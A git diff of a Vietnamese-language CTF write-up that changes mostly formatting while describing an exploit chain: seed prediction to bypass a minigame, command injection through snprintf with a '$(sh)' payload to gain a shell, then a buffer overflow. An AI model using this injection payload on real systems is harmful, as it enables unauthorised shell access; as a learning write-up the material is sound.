@@ -109,7 +109,7 @@ void printff(void)
 
 ___
 ### Khai thác:
-* Trước hết là bypass minigame bằng cách dựng seed tương tự:
+**Trước hết là bypass minigame bằng cách dựng seed tương tự:**
 
 Trong python:
 ```python
@@ -118,7 +118,7 @@ libc_native.srand(int(time.time()))
 ```
 Chạy đủ 20 attempts để đến với hàm `getname()`
 
-* Lỗi command injection:
+**Lỗi command injection:**
 
 Nằm ở đoạn:
 ```c
@@ -126,14 +126,18 @@ Nằm ở đoạn:
   __isoc99_scanf(&DAT_00102068,&name);
   snprintf(cmd,64,cmd_fmt,&name);
 ```
-`__isoc99_scanf(&DAT_00102068,&name);`: cho đọc 8 byte string vào `name`
+* `__isoc99_scanf(&DAT_00102068,&name);`: cho đọc 8 byte string vào `name`
+
 <img width="753" height="126" alt="image" src="https://github.com/user-attachments/assets/d1ce6c10-6d3d-4455-8c2a-3b3aa3a1bfd2" />
-`snprintf(cmd,64,cmd_fmt,&name);`: 
+
+* `snprintf(cmd,64,cmd_fmt,&name);`: 
   * "echo \"%s\" > /tmp/pingpong_scoreboard"
   * `%s` sẽ là format string cho `&name`
   ==> sẽ thành: `echo "command_injection" > /tmp/pingpong_scoreboard`
+
 <img width="756" height="113" alt="image" src="https://github.com/user-attachments/assets/40c616ca-74a4-4d35-ab09-99c5a69450f6" />
-Ví dụ:
+
+* Ví dụ:
 ```c
 echo $(ls)
 
@@ -146,9 +150,9 @@ và ta sẽ dùng lệnh sau để cho shell ( < 8 bytes ):
 echo "$(sh)" > /tmp/pingpong_scoreboard
 ```
 
-sau đấy, gọi `printff()` với lệnh `system(cmd)` để kích hoạt lệnh shell trên 
+* sau đấy, gọi `printff()` với lệnh `system(cmd)` để kích hoạt lệnh shell trên 
 
-* Đó là khi cần đến BOF:
+**Đó là khi cần đến BOF:**
 
 Ở đoạn:
 ```c
